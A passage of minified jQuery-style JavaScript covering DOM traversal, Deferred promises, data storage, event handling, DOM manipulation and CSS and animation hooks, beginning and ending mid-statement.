t,n,r=this.length,o=this;if("string"!=typeof e)return this.pushStack(me(e).filter(function(){for(t=0;t<r;t++)if(me.contains(o[t],this))return!0}));for(n=this.pushStack([]),t=0;t<r;t++)me.find(e,o[t],n);return r>1?me.uniqueSort(n):n},filter:function(e){return this.pushStack(i(this,e||[],!1))},not:function(e){return this.pushStack(i(this,e||[],!0))},is:function(e){return!!i(this,"string"==typeof e&&_e.test(e)?me(e):e||[],!1).length}});var je,Ee=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/,ke=me.fn.init=function(e,t,n){var r,o;if(!e)return this;if(n=n||je,"string"==typeof e){if(r="<"===e[0]&&">"===e[e.length-1]&&e.length>=3?[null,e,null]:Ee.exec(e),!r||!r[1]&&t)return!t||t.jquery?(t||n).find(e):this.constructor(t).find(e);if(r[1]){if(t=t instanceof me?t[0]:t,me.merge(this,me.parseHTML(r[1],t&&t.nodeType?t.ownerDocument||t:ne,!0)),Ce.test(r[1])&&me.isPlainObject(t))for(r in t)me.isFunction(this[r])?this[r](t[r]):this.attr(r,t[r]);return this}return o=ne.getElementById(r[2]),o&&(this[0]=o,this.length=1),this}return e.nodeType?(this[0]=e,this.length=1,this):me.isFunction(e)?void 0!==n.ready?n.ready(e):e(me):me.makeArray(e,this)};ke.prototype=me.fn,je=me(ne);var Ne=/^(?:parents|prev(?:Until|All))/,De={children:!0,contents:!0,next:!0,prev:!0};me.fn.extend({has:function(e){var t=me(e,this),n=t.length;return this.filter(function(){for(var e=0;e<n;e++)if(me.contains(this,t[e]))return!0})},closest:function(e,t){var n,r=0,o=this.length,i=[],a="string"!=typeof e&&me(e);if(!_e.test(e))for(;r<o;r++)for(n=this[r];n&&n!==t;n=n.parentNode)if(n.nodeType<11&&(a?a.index(n)>-1:1===n.nodeType&&me.find.matchesSelector(n,e))){i.push(n);break}return this.pushStack(i.length>1?me.uniqueSort(i):i)},index:function(e){return e?"string"==typeof e?se.call(me(e),this[0]):se.call(this,e.jquery?e[0]:e):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){return this.pushStack(me.uniqueSort(me.merge(this.get(),me(e,t))))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}}),me.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return we(e,"parentNode")},parentsUntil:function(e,t,n){return we(e,"parentNode",n)},next:function(e){return a(e,"nextSibling")},prev:function(e){return a(e,"previousSibling")},nextAll:function(e){return we(e,"nextSibling")},prevAll:function(e){return we(e,"previousSibling")},nextUntil:function(e,t,n){return we(e,"nextSibling",n)},prevUntil:function(e,t,n){return we(e,"previousSibling",n)},siblings:function(e){return Te((e.parentNode||{}).firstChild,e)},children:function(e){return Te(e.firstChild)},contents:function(e){return e.contentDocument||me.merge([],e.childNodes)}},function(e,t){me.fn[e]=function(n,r){var o=me.map(this,t,n);return"Until"!==e.slice(-5)&&(r=n),r&&"string"==typeof r&&(o=me.filter(r,o)),this.length>1&&(De[e]||me.uniqueSort(o),Ne.test(e)&&o.reverse()),this.pushStack(o)}});var Ae=/[^\x20\t\r\n\f]+/g;me.Callbacks=function(e){e="string"==typeof e?s(e):me.extend({},e);var t,n,r,o,i=[],a=[],u=-1,l=function(){for(o=e.once,r=t=!0;a.length;u=-1)for(n=a.shift();++u<i.length;)i[u].apply(n[0],n[1])===!1&&e.stopOnFalse&&(u=i.length,n=!1);e.memory||(n=!1),t=!1,o&&(i=n?[]:"")},c={add:function(){return i&&(n&&!t&&(u=i.length-1,a.push(n)),function t(n){me.each(n,function(n,r){me.isFunction(r)?e.unique&&c.has(r)||i.push(r):r&&r.length&&"string"!==me.type(r)&&t(r)})}(arguments),n&&!t&&l()),this},remove:function(){return me.each(arguments,function(e,t){for(var n;(n=me.inArray(t,i,n))>-1;)i.splice(n,1),n<=u&&u--}),this},has:function(e){return e?me.inArray(e,i)>-1:i.length>0},empty:function(){return i&&(i=[]),this},disable:function(){return o=a=[],i=n="",this},disabled:function(){return!i},lock:function(){return o=a=[],n||t||(i=n=""),this},locked:function(){return!!o},fireWith:function(e,n){return o||(n=n||[],n=[e,n.slice?n.slice():n],a.push(n),t||l()),this},fire:function(){return c.fireWith(this,arguments),this},fired:function(){return!!r}};return c},me.extend({Deferred:function(e){var n=[["notify","progress",me.Callbacks("memory"),me.Callbacks("memory"),2],["resolve","done",me.Callbacks("once memory"),me.Callbacks("once memory"),0,"resolved"],["reject","fail",me.Callbacks("once memory"),me.Callbacks("once memory"),1,"rejected"]],r="pending",o={state:function(){return r},always:function(){return i.done(arguments).fail(arguments),this},catch:function(e){return o.then(null,e)},pipe:function(){var e=arguments;return me.Deferred(function(t){me.each(n,function(n,r){var o=me.isFunction(e[r[4]])&&e[r[4]];i[r[1]](function(){var e=o&&o.apply(this,arguments);e&&me.isFunction(e.promise)?e.promise().progress(t.notify).done(t.resolve).fail(t.reject):t[r[0]+"With"](this,o?[e]:arguments)})}),e=null}).promise()},then:function(e,r,o){function i(e,n,r,o){return function(){var s=this,c=arguments,f=function(){var t,f;if(!(e<a)){if(t=r.apply(s,c),t===n.promise())throw new TypeError("Thenable self-resolution");f=t&&("object"==typeof t||"function"==typeof t)&&t.then,me.isFunction(f)?o?f.call(t,i(a,n,u,o),i(a,n,l,o)):(a++,f.call(t,i(a,n,u,o),i(a,n,l,o),i(a,n,u,n.notifyWith))):(r!==u&&(s=void 0,c=[t]),(o||n.resolveWith)(s,c))}},d=o?f:function(){try{f()}catch(t){me.Deferred.exceptionHook&&me.Deferred.exceptionHook(t,d.stackTrace),e+1>=a&&(r!==l&&(s=void 0,c=[t]),n.rejectWith(s,c))}};e?d():(me.Deferred.getStackHook&&(d.stackTrace=me.Deferred.getStackHook()),t.setTimeout(d))}}var a=0;return me.Deferred(function(t){n[0][3].add(i(0,t,me.isFunction(o)?o:u,t.notifyWith)),n[1][3].add(i(0,t,me.isFunction(e)?e:u)),n[2][3].add(i(0,t,me.isFunction(r)?r:l))}).promise()},promise:function(e){return null!=e?me.extend(e,o):o}},i={};return me.each(n,function(e,t){var a=t[2],s=t[5];o[t[1]]=a.add,s&&a.add(function(){r=s},n[3-e][2].disable,n[0][2].lock),a.add(t[3].fire),i[t[0]]=function(){return i[t[0]+"With"](this===i?void 0:this,arguments),this},i[t[0]+"With"]=a.fireWith}),o.promise(i),e&&e.call(i,i),i},when:function(e){var t=arguments.length,n=t,r=Array(n),o=oe.call(arguments),i=me.Deferred(),a=function(e){return function(n){r[e]=this,o[e]=arguments.length>1?oe.call(arguments):n,--t||i.resolveWith(r,o)}};if(t<=1&&(c(e,i.done(a(n)).resolve,i.reject),"pending"===i.state()||me.isFunction(o[n]&&o[n].then)))return i.then();for(;n--;)c(o[n],a(n),i.reject);return i.promise()}});var Oe=/^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;me.Deferred.exceptionHook=function(e,n){t.console&&t.console.warn&&e&&Oe.test(e.name)&&t.console.warn("jQuery.Deferred exception: "+e.message,e.stack,n)},me.readyException=function(e){t.setTimeout(function(){throw e})};var qe=me.Deferred();me.fn.ready=function(e){return qe.then(e).catch(function(e){me.readyException(e)}),this},me.extend({isReady:!1,readyWait:1,holdReady:function(e){e?me.readyWait++:me.ready(!0)},ready:function(e){(e===!0?--me.readyWait:me.isReady)||(me.isReady=!0,e!==!0&&--me.readyWait>0||qe.resolveWith(ne,[me]))}}),me.ready.then=qe.then,"complete"===ne.readyState||"loading"!==ne.readyState&&!ne.documentElement.doScroll?t.setTimeout(me.ready):(ne.addEventListener("DOMContentLoaded",f),t.addEventListener("load",f));var Me=function(e,t,n,r,o,i,a){var s=0,u=e.length,l=null==n;if("object"===me.type(n)){o=!0;for(s in n)Me(e,t,s,n[s],!0,i,a)}else if(void 0!==r&&(o=!0,me.isFunction(r)||(a=!0),l&&(a?(t.call(e,r),t=null):(l=t,t=function(e,t,n){return l.call(me(e),n)})),t))for(;s<u;s++)t(e[s],n,a?r:r.call(e[s],s,t(e[s],n)));return o?e:l?t.call(e):u?t(e[0],n):i},Le=function(e){return 1===e.nodeType||9===e.nodeType||!+e.nodeType};d.uid=1,d.prototype={cache:function(e){var t=e[this.expando];return t||(t={},Le(e)&&(e.nodeType?e[this.expando]=t:Object.defineProperty(e,this.expando,{value:t,configurable:!0}))),t},set:function(e,t,n){var r,o=this.cache(e);if("string"==typeof t)o[me.camelCase(t)]=n;else for(r in t)o[me.camelCase(r)]=t[r];return o},get:function(e,t){return void 0===t?this.cache(e):e[this.expando]&&e[this.expando][me.camelCase(t)]},access:function(e,t,n){return void 0===t||t&&"string"==typeof t&&void 0===n?this.get(e,t):(this.set(e,t,n),void 0!==n?n:t)},remove:function(e,t){var n,r=e[this.expando];if(void 0!==r){if(void 0!==t){me.isArray(t)?t=t.map(me.camelCase):(t=me.camelCase(t),t=t in r?[t]:t.match(Ae)||[]),n=t.length;for(;n--;)delete r[t[n]]}(void 0===t||me.isEmptyObject(r))&&(e.nodeType?e[this.expando]=void 0:delete e[this.expando])}},hasData:function(e){var t=e[this.expando];return void 0!==t&&!me.isEmptyObject(t)}};var Pe=new d,Fe=new d,He=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,Re=/[A-Z]/g;me.extend({hasData:function(e){return Fe.hasData(e)||Pe.hasData(e)},data:function(e,t,n){return Fe.access(e,t,n)},removeData:function(e,t){Fe.remove(e,t)},_data:function(e,t,n){return Pe.access(e,t,n)},_removeData:function(e,t){Pe.remove(e,t)}}),me.fn.extend({data:function(e,t){var n,r,o,i=this[0],a=i&&i.attributes;if(void 0===e){if(this.length&&(o=Fe.get(i),1===i.nodeType&&!Pe.get(i,"hasDataAttrs"))){for(n=a.length;n--;)a[n]&&(r=a[n].name,0===r.indexOf("data-")&&(r=me.camelCase(r.slice(5)),h(i,r,o[r])));Pe.set(i,"hasDataAttrs",!0)}return o}return"object"==typeof e?this.each(function(){Fe.set(this,e)}):Me(this,function(t){var n;if(i&&void 0===t){if(n=Fe.get(i,e),void 0!==n)return n;if(n=h(i,e),void 0!==n)return n}else this.each(function(){Fe.set(this,e,t)})},null,t,arguments.length>1,null,!0)},removeData:function(e){return this.each(function(){Fe.remove(this,e)})}}),me.extend({queue:function(e,t,n){var r;if(e)return t=(t||"fx")+"queue",r=Pe.get(e,t),n&&(!r||me.isArray(n)?r=Pe.access(e,t,me.makeArray(n)):r.push(n)),r||[]},dequeue:function(e,t){t=t||"fx";var n=me.queue(e,t),r=n.length,o=n.shift(),i=me._queueHooks(e,t),a=function(){me.dequeue(e,t)};"inprogress"===o&&(o=n.shift(),r--),o&&("fx"===t&&n.unshift("inprogress"),delete i.stop,o.call(e,a,i)),!r&&i&&i.empty.fire()},_queueHooks:function(e,t){var n=t+"queueHooks";return Pe.get(e,n)||Pe.access(e,n,{empty:me.Callbacks("once memory").add(function(){Pe.remove(e,[t+"queue",n])})})}}),me.fn.extend({queue:function(e,t){var n=2;return"string"!=typeof e&&(t=e,e="fx",n--),arguments.length<n?me.queue(this[0],e):void 0===t?this:this.each(function(){var n=me.queue(this,e,t);me._queueHooks(this,e),"fx"===e&&"inprogress"!==n[0]&&me.dequeue(this,e)})},dequeue:function(e){return this.each(function(){me.dequeue(this,e)})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,t){var n,r=1,o=me.Deferred(),i=this,a=this.length,s=function(){--r||o.resolveWith(i,[i])};for("string"!=typeof e&&(t=e,e=void 0),e=e||"fx";a--;)n=Pe.get(i[a],e+"queueHooks"),n&&n.empty&&(r++,n.empty.add(s));return s(),o.promise(t)}});var Ie=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,We=new RegExp("^(?:([+-])=|)("+Ie+")([a-z%]*)$","i"),$e=["Top","Right","Bottom","Left"],ze=function(e,t){return e=t||e,"none"===e.style.display||""===e.style.display&&me.contains(e.ownerDocument,e)&&"none"===me.css(e,"display")},Be=function(e,t,n,r){var o,i,a={};for(i in t)a[i]=e.style[i],e.style[i]=t[i];o=n.apply(e,r||[]);for(i in t)e.style[i]=a[i];return o},Ge={};me.fn.extend({show:function(){return g(this,!0)},hide:function(){return g(this)},toggle:function(e){return"boolean"==typeof e?e?this.show():this.hide():this.each(function(){ze(this)?me(this).show():me(this).hide()})}});var Ue=/^(?:checkbox|radio)$/i,Ve=/<([a-z][^\/\0>\x20\t\r\n\f]+)/i,Xe=/^$|\/(?:java|ecma)script/i,Ye={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};Ye.optgroup=Ye.option,Ye.tbody=Ye.tfoot=Ye.colgroup=Ye.caption=Ye.thead,Ye.th=Ye.td;var Ke=/<|&#?\w+;/;!function(){var e=ne.createDocumentFragment(),t=e.appendChild(ne.createElement("div")),n=ne.createElement("input");n.setAttribute("type","radio"),n.setAttribute("checked","checked"),n.setAttribute("name","t"),t.appendChild(n),pe.checkClone=t.cloneNode(!0).cloneNode(!0).lastChild.checked,t.innerHTML="<textarea>x</textarea>",pe.noCloneChecked=!!t.cloneNode(!0).lastChild.defaultValue}();var Qe=ne.documentElement,Je=/^key/,Ze=/^(?:mouse|pointer|contextmenu|drag|drop)|click/,et=/^([^.]*)(?:\.(.+)|)/;me.event={global:{},add:function(e,t,n,r,o){var i,a,s,u,l,c,f,d,p,h,m,v=Pe.get(e);if(v)for(n.handler&&(i=n,n=i.handler,o=i.selector),o&&me.find.matchesSelector(Qe,o),n.guid||(n.guid=me.guid++),(u=v.events)||(u=v.events={}),(a=v.handle)||(a=v.handle=function(t){return"undefined"!=typeof me&&me.event.triggered!==t.type?me.event.dispatch.apply(e,arguments):void 0}),t=(t||"").match(Ae)||[""],l=t.length;l--;)s=et.exec(t[l])||[],p=m=s[1],h=(s[2]||"").split(".").sort(),p&&(f=me.event.special[p]||{},p=(o?f.delegateType:f.bindType)||p,f=me.event.special[p]||{},c=me.extend({type:p,origType:m,data:r,handler:n,guid:n.guid,selector:o,needsContext:o&&me.expr.match.needsContext.test(o),namespace:h.join(".")},i),(d=u[p])||(d=u[p]=[],d.delegateCount=0,f.setup&&f.setup.call(e,r,h,a)!==!1||e.addEventListener&&e.addEventListener(p,a)),f.add&&(f.add.call(e,c),c.handler.guid||(c.handler.guid=n.guid)),o?d.splice(d.delegateCount++,0,c):d.push(c),me.event.global[p]=!0)},remove:function(e,t,n,r,o){var i,a,s,u,l,c,f,d,p,h,m,v=Pe.hasData(e)&&Pe.get(e);if(v&&(u=v.events)){for(t=(t||"").match(Ae)||[""],l=t.length;l--;)if(s=et.exec(t[l])||[],p=m=s[1],h=(s[2]||"").split(".").sort(),p){for(f=me.event.special[p]||{},p=(r?f.delegateType:f.bindType)||p,d=u[p]||[],s=s[2]&&new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"),a=i=d.length;i--;)c=d[i],!o&&m!==c.origType||n&&n.guid!==c.guid||s&&!s.test(c.namespace)||r&&r!==c.selector&&("**"!==r||!c.selector)||(d.splice(i,1),c.selector&&d.delegateCount--,f.remove&&f.remove.call(e,c));a&&!d.length&&(f.teardown&&f.teardown.call(e,h,v.handle)!==!1||me.removeEvent(e,p,v.handle),delete u[p])}else for(p in u)me.event.remove(e,p+t[l],n,r,!0);me.isEmptyObject(u)&&Pe.remove(e,"handle events")}},dispatch:function(e){var t,n,r,o,i,a,s=me.event.fix(e),u=new Array(arguments.length),l=(Pe.get(this,"events")||{})[s.type]||[],c=me.event.special[s.type]||{};for(u[0]=s,t=1;t<arguments.length;t++)u[t]=arguments[t];if(s.delegateTarget=this,!c.preDispatch||c.preDispatch.call(this,s)!==!1){for(a=me.event.handlers.call(this,s,l),t=0;(o=a[t++])&&!s.isPropagationStopped();)for(s.currentTarget=o.elem,n=0;(i=o.handlers[n++])&&!s.isImmediatePropagationStopped();)s.rnamespace&&!s.rnamespace.test(i.namespace)||(s.handleObj=i,s.data=i.data,r=((me.event.special[i.origType]||{}).handle||i.handler).apply(o.elem,u),void 0!==r&&(s.result=r)===!1&&(s.preventDefault(),s.stopPropagation()));return c.postDispatch&&c.postDispatch.call(this,s),s.result}},handlers:function(e,t){var n,r,o,i,a,s=[],u=t.delegateCount,l=e.target;if(u&&l.nodeType&&!("click"===e.type&&e.button>=1))for(;l!==this;l=l.parentNode||this)if(1===l.nodeType&&("click"!==e.type||l.disabled!==!0)){for(i=[],a={},n=0;n<u;n++)r=t[n],o=r.selector+" ",void 0===a[o]&&(a[o]=r.needsContext?me(o,this).index(l)>-1:me.find(o,this,null,[l]).length),a[o]&&i.push(r);i.length&&s.push({elem:l,handlers:i})}return l=this,u<t.length&&s.push({elem:l,handlers:t.slice(u)}),s},addProp:function(e,t){Object.defineProperty(me.Event.prototype,e,{enumerable:!0,configurable:!0,get:me.isFunction(t)?function(){if(this.originalEvent)return t(this.originalEvent)}:function(){if(this.originalEvent)return this.originalEvent[e]},set:function(t){Object.defineProperty(this,e,{enumerable:!0,configurable:!0,writable:!0,value:t})}})},fix:function(e){return e[me.expando]?e:new me.Event(e)},special:{load:{noBubble:!0},focus:{trigger:function(){if(this!==_()&&this.focus)return this.focus(),!1},delegateType:"focusin"},blur:{trigger:function(){if(this===_()&&this.blur)return this.blur(),!1},delegateType:"focusout"},click:{trigger:function(){if("checkbox"===this.type&&this.click&&me.nodeName(this,"input"))return this.click(),!1},_default:function(e){return me.nodeName(e.target,"a")}},beforeunload:{postDispatch:function(e){void 0!==e.result&&e.originalEvent&&(e.originalEvent.returnValue=e.result)}}}},me.removeEvent=function(e,t,n){e.removeEventListener&&e.removeEventListener(t,n)},me.Event=function(e,t){return this instanceof me.Event?(e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||void 0===e.defaultPrevented&&e.returnValue===!1?w:T,this.target=e.target&&3===e.target.nodeType?e.target.parentNode:e.target,this.currentTarget=e.currentTarget,this.relatedTarget=e.relatedTarget):this.type=e,t&&me.extend(this,t),this.timeStamp=e&&e.timeStamp||me.now(),void(this[me.expando]=!0)):new me.Event(e,t)},me.Event.prototype={constructor:me.Event,isDefaultPrevented:T,isPropagationStopped:T,isImmediatePropagationStopped:T,isSimulated:!1,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=w,e&&!this.isSimulated&&e.preventDefault()},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=w,e&&!this.isSimulated&&e.stopPropagation()},stopImmediatePropagation:function(){var e=this.originalEvent;this.isImmediatePropagationStopped=w,e&&!this.isSimulated&&e.stopImmediatePropagation(),this.stopPropagation()}},me.each({altKey:!0,bubbles:!0,cancelable:!0,changedTouches:!0,ctrlKey:!0,detail:!0,eventPhase:!0,metaKey:!0,pageX:!0,pageY:!0,shiftKey:!0,view:!0,char:!0,charCode:!0,key:!0,keyCode:!0,button:!0,buttons:!0,clientX:!0,clientY:!0,offsetX:!0,offsetY:!0,pointerId:!0,pointerType:!0,screenX:!0,screenY:!0,targetTouches:!0,toElement:!0,touches:!0,which:function(e){var t=e.button;return null==e.which&&Je.test(e.type)?null!=e.charCode?e.charCode:e.keyCode:!e.which&&void 0!==t&&Ze.test(e.type)?1&t?1:2&t?3:4&t?2:0:e.which}},me.event.addProp),me.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(e,t){me.event.special[e]={delegateType:t,bindType:t,handle:function(e){var n,r=this,o=e.relatedTarget,i=e.handleObj;return o&&(o===r||me.contains(r,o))||(e.type=i.origType,n=i.handler.apply(this,arguments),e.type=t),n}}}),me.fn.extend({on:function(e,t,n,r){return C(this,e,t,n,r)},one:function(e,t,n,r){return C(this,e,t,n,r,1)},off:function(e,t,n){var r,o;if(e&&e.preventDefault&&e.handleObj)return r=e.handleObj,me(e.delegateTarget).off(r.namespace?r.origType+"."+r.namespace:r.origType,r.selector,r.handler),this;if("object"==typeof e){for(o in e)this.off(o,t,e[o]);return this}return t!==!1&&"function"!=typeof t||(n=t,t=void 0),n===!1&&(n=T),this.each(function(){me.event.remove(this,e,n,t)})}});var tt=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,nt=/<script|<style|<link/i,rt=/checked\s*(?:[^=]|=\s*.checked.)/i,ot=/^true\/(.*)/,it=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;me.extend({htmlPrefilter:function(e){return e.replace(tt,"<$1></$2>")},clone:function(e,t,n){var r,o,i,a,s=e.cloneNode(!0),u=me.contains(e.ownerDocument,e);if(!(pe.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||me.isXMLDoc(e)))for(a=y(s),i=y(e),r=0,o=i.length;r<o;r++)N(i[r],a[r]);if(t)if(n)for(i=i||y(e),a=a||y(s),r=0,o=i.length;r<o;r++)k(i[r],a[r]);else k(e,s);return a=y(s,"script"),a.length>0&&x(a,!u&&y(e,"script")),s},cleanData:function(e){for(var t,n,r,o=me.event.special,i=0;void 0!==(n=e[i]);i++)if(Le(n)){if(t=n[Pe.expando]){if(t.events)for(r in t.events)o[r]?me.event.remove(n,r):me.removeEvent(n,r,t.handle);n[Pe.expando]=void 0}n[Fe.expando]&&(n[Fe.expando]=void 0)}}}),me.fn.extend({detach:function(e){return A(this,e,!0)},remove:function(e){return A(this,e)},text:function(e){return Me(this,function(e){return void 0===e?me.text(this):this.empty().each(function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=e)})},null,e,arguments.length)},append:function(){return D(this,arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=S(this,e);t.appendChild(e)}})},prepend:function(){return D(this,arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=S(this,e);t.insertBefore(e,t.firstChild)}})},before:function(){return D(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return D(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},empty:function(){for(var e,t=0;null!=(e=this[t]);t++)1===e.nodeType&&(me.cleanData(y(e,!1)),e.textContent="");return this},clone:function(e,t){return e=null!=e&&e,t=null==t?e:t,this.map(function(){return me.clone(this,e,t)})},html:function(e){return Me(this,function(e){var t=this[0]||{},n=0,r=this.length;if(void 0===e&&1===t.nodeType)return t.innerHTML;if("string"==typeof e&&!nt.test(e)&&!Ye[(Ve.exec(e)||["",""])[1].toLowerCase()]){e=me.htmlPrefilter(e);try{for(;n<r;n++)t=this[n]||{},1===t.nodeType&&(me.cleanData(y(t,!1)),t.innerHTML=e);t=0}catch(e){}}t&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(){var e=[];return D(this,arguments,function(t){var n=this.parentNode;me.inArray(this,e)<0&&(me.cleanData(y(this)),n&&n.replaceChild(t,this))},e)}}),me.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,t){me.fn[e]=function(e){for(var n,r=[],o=me(e),i=o.length-1,a=0;a<=i;a++)n=a===i?this:this.clone(!0),me(o[a])[t](n),ae.apply(r,n.get());return this.pushStack(r)}});var at=/^margin/,st=new RegExp("^("+Ie+")(?!px)[a-z%]+$","i"),ut=function(e){var n=e.ownerDocument.defaultView;return n&&n.opener||(n=t),n.getComputedStyle(e)};!function(){function e(){if(s){s.style.cssText="box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%",s.innerHTML="",Qe.appendChild(a);var e=t.getComputedStyle(s);n="1%"!==e.top,i="2px"===e.marginLeft,r="4px"===e.width,s.style.marginRight="50%",o="4px"===e.marginRight,Qe.removeChild(a),s=null}}var n,r,o,i,a=ne.createElement("div"),s=ne.createElement("div");s.style&&(s.style.backgroundClip="content-box",s.cloneNode(!0).style.backgroundClip="",pe.clearCloneStyle="content-box"===s.style.backgroundClip,a.style.cssText="border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute",a.appendChild(s),me.extend(pe,{pixelPosition:function(){return e(),n},boxSizingReliable:function(){return e(),r},pixelMarginRight:function(){return e(),o},reliableMarginLeft:function(){return e(),i}}))}();var lt=/^(none|table(?!-c[ea]).+)/,ct={position:"absolute",visibility:"hidden",display:"block"},ft={letterSpacing:"0",fontWeight:"400"},dt=["Webkit","Moz","ms"],pt=ne.createElement("div").style;me.extend({cssHooks:{opacity:{get:function(e,t){if(t){var n=O(e,"opacity");return""===n?"1":n}}}},cssNumber:{animationIterationCount:!0,columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{float:"cssFloat"},style:function(e,t,n,r){if(e&&3!==e.nodeType&&8!==e.nodeType&&e.style){var o,i,a,s=me.camelCase(t),u=e.style;return t=me.cssProps[s]||(me.cssProps[s]=M(s)||s),a=me.cssHooks[t]||me.cssHooks[s],void 0===n?a&&"get"in a&&void 0!==(o=a.get(e,!1,r))?o:u[t]:(i=typeof n,"string"===i&&(o=We.exec(n))&&o[1]&&(n=m(e,t,o),i="number"),null!=n&&n===n&&("number"===i&&(n+=o&&o[3]||(me.cssNumber[s]?"":"px")),pe.clearCloneStyle||""!==n||0!==t.indexOf("background")||(u[t]="inherit"),a&&"set"in a&&void 0===(n=a.set(e,n,r))||(u[t]=n)),void 0)}},css:function(e,t,n,r){var o,i,a,s=me.camelCase(t);return t=me.cssProps[s]||(me.cssProps[s]=M(s)||s),a=me.cssHooks[t]||me.cssHooks[s],a&&"get"in a&&(o=a.get(e,!0,n)),void 0===o&&(o=O(e,t,r)),"normal"===o&&t in ft&&(o=ft[t]),""===n||n?(i=parseFloat(o),n===!0||isFinite(i)?i||0:o):o}}),me.each(["height","width"],function(e,t){me.cssHooks[t]={get:function(e,n,r){if(n)return!lt.test(me.css(e,"display"))||e.getClientRects().length&&e.getBoundingClientRect().width?F(e,t,r):Be(e,ct,function(){return F(e,t,r)})},set:function(e,n,r){var o,i=r&&ut(e),a=r&&P(e,t,r,"border-box"===me.css(e,"boxSizing",!1,i),i);return a&&(o=We.exec(n))&&"px"!==(o[3]||"px")&&(e.style[t]=n,n=me.css(e,t)),L(e,n,a)}}}),me.cssHooks.marginLeft=q(pe.reliableMarginLeft,function(e,t){if(t)return(parseFloat(O(e,"marginLeft"))||e.getBoundingClientRect().left-Be(e,{marginLeft:0},function(){return e.getBoundingClientRect().left}))+"px"}),me.each({margin:"",padding:"",border:"Width"},function(e,t){me.cssHooks[e+t]={expand:function(n){for(var r=0,o={},i="string"==typeof n?n.split(" "):[n];r<4;r++)o[e+$e[r]+t]=i[r]||i[r-2]||i[0];return o}},at.test(e)||(me.cssHooks[e+t].set=L)}),me.fn.extend({css:function(e,t){return Me(this,function(e,t,n){var r,o,i={},a=0;if(me.isArray(t)){for(r=ut(e),o=t.length;a<o;a++)i[t[a]]=me.css(e,t[a],!1,r);return i}return void 0!==n?me.style(e,t,n):me.css(e,t)},e,t,arguments.length>1)}}),me.Tween=H,H.prototype={constructor:H,init:function(e,t,n,r,o,i){this.elem=e,this.prop=n,this.easing=o||me.easing._default,this.options=t,this.start=this.now=this.cur(),this.end=r,this.unit=i||(me.cssNumber[n]?"":"px")},cur:function(){var e=H.propHooks[this.prop];return e&&e.get?e.get(this):H.propHooks._default.get(this)},run:function(e){var t,n=H.propHooks[this.prop];return this.options.duration?this.pos=t=me.easing[this.easing](e,this.options.duration*e,0,1,this.options.duration):this.pos=t=e,this.now=(this.end-this.start)*t+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):H.propHooks._default.set(this),this}},H.prototype.init.prototype=H.prototype,H.propHooks={_default:{get:function(e){var t;return 1!==e.elem.nodeType||null!=e.elem[e.prop]&&null==e.elem.style[e.prop]?e.elem[e.prop]:(t=me.css(e.elem,e.prop,""),t&&"auto"!==t?t:0)},set:function(e){me.fx.step[e.prop]?me.fx.step[e.prop](e):1!==e.elem.nodeType||null==e.elem.style[me.cssProps[e.prop]]&&!me.cssHooks[e.prop]?e.elem[e.prop]=e.now:me.style(e.elem,e.prop,e.now+e.unit)}}},H.propHooks.scrollTop=H.propHooks.scrollLeft={set:function(e){e.elem.nodeType&&e.elem.parentNode&&(e.elem[e.prop]=e.now)}},me.easing={linear:function(e){return e},swing:function(e){return.5-Math.cos(e*Math.PI)/2},_default:"swing"},me.fx=H.prototype.init,me.fx.step={};var ht,mt,vt=/^(?:toggle|show|hide)$/,gt=/queueHooks$/;me.Animation=me.extend(G,{tweeners:{"*":[function(e,t){var n=this.createTween(e,t);return m(n.elem,e,We.exec(t),n),n}]},tweener:function(e,t){me.isFunction(e)?(t=e,e=["*"]):e=e.match(Ae);for(var n,r=0,o=e.length;r<o;r++)n=e[r],G.tweeners[n]=G.tweeners[n]||[],G.tweeners[n].unshift(t)},prefilters:[z],prefilter:function(e,t){t?G.prefilters.unshift(e):G.prefilters.push(e)}}),me.speed=function(e,t,n){var r=e&&"object"==typeof e?me.extend({},e):{complete:n||!n&&t||me.isFunction(e)&&e,duration:e,easing:n&&t||t&&!me.isFunction(t)&&t};return me.fx.off||ne.hidden?r.duration=0:"number"!=typeof r.duration&&(r.duration in me.fx.speeds?r.duration=me.fx.speeds[r.duration]:r.duration=me.fx.speeds._default),
